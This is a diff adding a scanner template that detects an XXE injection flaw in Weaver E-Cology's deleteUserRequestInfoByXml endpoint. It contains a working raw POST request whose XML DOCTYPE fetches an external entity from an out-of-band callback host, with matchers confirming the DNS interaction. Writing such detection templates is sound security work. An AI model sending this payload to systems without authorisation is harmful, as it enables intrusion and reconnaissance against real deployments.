@@ -1,0 +1,30 @@
+id: poc-yaml-weaver-e-cology-deleteuserrequestInfobyxml-xxe
+info:
+  name: Weaver E-Cology deleteUserRequestInfoByXml XXE Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+http:
+  - raw:
+      - |
+        POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+        <M><syscode>&send;</syscode></M>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ecology_JSessionid"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
